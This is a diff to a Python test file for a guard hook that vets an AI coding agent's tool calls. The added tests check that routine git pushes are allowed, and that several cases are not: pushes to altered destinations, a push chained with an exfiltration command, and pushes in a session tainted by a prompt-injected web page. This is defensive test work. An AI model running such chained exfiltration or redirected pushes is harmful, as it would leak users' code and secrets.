@@ -8,6 +8,7 @@ would have. Every case in DENY is an action that actually damages the machine.
 from __future__ import annotations
 
 import contextlib
+import atexit
 import json
 import os
 import socketserver
@@ -16,6 +17,9 @@ import sys
 import tempfile
 import threading
 import time
+import shutil
+
+from test_hook_lifecycle import running_app
 
 HOOK = os.path.join(os.path.dirname(os.path.abspath(__file__)), "secret_guard.py")
 
@@ -24,6 +28,10 @@ HOOK = os.path.join(os.path.dirname(os.path.abspath(__file__)), "secret_guard.py
 # appends to the real ~/.agents/logs / activity.jsonl forensic trail. Tests
 # build all home-relative paths from this constant.
 HOME = tempfile.mkdtemp(prefix="secret-guard-test-home-")
+atexit.register(shutil.rmtree, HOME, True)
+_APP_LEASE = running_app(HOME)
+_APP_LEASE.__enter__()
+atexit.register(_APP_LEASE.__exit__, None, None, None)
 
 # The module reads HOME and the activity log path at import, so the in-process
 # layer imports it only after both point into the temp HOME.
@@ -1617,6 +1625,68 @@ EXTRA_TESTS += [
     test_untrusted_egress_foreign_instruction_file_taints_the_session,
     test_untrusted_egress_reading_a_foreign_instruction_file,
 ]
+
+
+def _configured_push_fixture(sid, mode="prompt"):
+    repo = tempfile.mkdtemp(prefix="configured-push-")
+    for args in [("init", "-q", "-b", "main"), ("remote", "add", "origin", "https://github.com/owner/project.git")]:
+        subprocess.run(["git", "-C", repo, *args], check=True, capture_output=True)
+    env = _egress_env(mode)
+    payload = _session(sid, "PostToolUse", "WebFetch", {"url": "https://docs.example.com/guide"})
+    payload["cwd"] = repo
+    run(payload, env=env)
+    return repo, env
+
+
+def test_configured_git_pushes_do_not_prompt_repeatedly():
+    repo, env = _configured_push_fixture("expected-push")
+    for command in ["git push -u origin HEAD", "git push origin HEAD", "git push", f"git -C {repo} push origin HEAD"]:
+        payload = _session("expected-push", "PreToolUse", "Bash", {"command": command})
+        payload["cwd"] = repo
+        out = run(payload, env=env)
+        assert out.get("permission") == "allow", (command, out)
+        assert last_audit_rule() == "guard-expected-git-push", out
+    # Setting an upstream during a normal first push must not invalidate the
+    # configured destination snapshot for every subsequent push.
+    subprocess.run(["git", "-C", repo, "config", "branch.main.remote", "origin"], check=True)
+    out = run({**payload, "tool_input": {"command": "git push"}}, env=env)
+    assert out.get("permission") == "allow", out
+
+
+def test_configured_git_push_does_not_allow_changed_or_additional_destinations():
+    repo, env = _configured_push_fixture("changed-push")
+    payload = _session("changed-push", "PreToolUse", "Bash", {})
+    payload["cwd"] = repo
+    for command in ["git push https://github.com/other/project.git HEAD",
+                    "git -c remote.origin.url=https://other.example/repo push origin HEAD",
+                    "git push origin HEAD && " + EXFIL]:
+        out = run({**payload, "tool_input": {"command": command}}, env=env)
+        assert out.get("permission") != "allow", (command, out)
+    subprocess.run(["git", "-C", repo, "remote", "set-url", "origin", "https://other.example/repo"], check=True)
+    out = run({**payload, "tool_input": {"command": "git push origin HEAD"}}, env=env)
+    assert out.get("permission") != "allow", out
+
+
+def test_configured_git_push_preserves_injection_and_explicit_policy():
+    repo, env = _configured_push_fixture("injected-push")
+    post = _session("injected-push", "PostToolUse", "WebFetch", {"url": "https://docs.example.com/guide"})
+    post.update(cwd=repo, tool_response={"content": INJECTED_PAGE})
+    run(post, env=env)
+    push = _session("injected-push", "PreToolUse", "Bash", {"command": "git push origin HEAD"})
+    push["cwd"] = repo
+    assert run(push, env=env).get("permission") != "allow"
+    repo, env = _configured_push_fixture("blocked-push", "deny")
+    push.update(session_id="blocked-push", cwd=repo)
+    assert run(push, env=env).get("permission") == "deny"
+    repo, env = _configured_push_fixture("explicit-push")
+    push.update(session_id="explicit-push", cwd=repo)
+    categories = {"SECURE_AGENT_GUARD_CATEGORIES": with_categories({"untrusted-egress": {"git-push": "prompt"}})["SECURE_AGENT_GUARD_CATEGORIES"]}
+    assert run(push, env={**env, **categories}).get("permission") != "allow"
+
+
+EXTRA_TESTS += [test_configured_git_pushes_do_not_prompt_repeatedly,
+                test_configured_git_push_does_not_allow_changed_or_additional_destinations,
+                test_configured_git_push_preserves_injection_and_explicit_policy]
 
 
 if __name__ == "__main__":
